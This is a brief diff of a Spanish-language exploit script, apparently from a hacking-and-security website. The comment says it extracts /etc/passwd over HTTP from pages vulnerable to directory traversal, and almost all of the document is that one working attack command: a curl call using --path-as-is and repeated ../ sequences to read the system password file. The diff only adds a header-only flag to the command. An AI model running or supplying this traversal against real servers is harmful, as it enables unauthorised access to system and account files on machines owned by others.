@@ -3,7 +3,7 @@
 # Exploits para extraer por http la password en la carperta Linux /etc/passwd, en paginas vulnerables a directorio traversal.
 #
 
-curl --path-as-is http://ip:80/../../../../../etc/passwd
+curl --path-as-is -I http://ip:80/../../../../../etc/passwd
 
 www.hackingyseguridad.com
 
